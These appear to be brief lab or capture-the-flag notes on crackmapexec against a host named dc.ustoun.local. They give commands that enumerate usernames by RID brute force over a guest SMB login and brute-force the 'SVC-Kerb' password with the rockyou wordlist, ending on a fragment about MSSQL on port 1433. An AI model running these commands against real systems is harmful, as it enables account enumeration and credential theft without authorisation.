# crackmapexec
Find usernames with the following:

```text-plain
crackmapexec smb dc.ustoun.local -u 'guest' -p '' --rid-brute
```

Brute force the user's password with:

```text-plain
crackmapexec smb dc.ustoun.local -u 'SVC-Kerb' -p 'rockyou.txt'
```

port 1433 is mssql,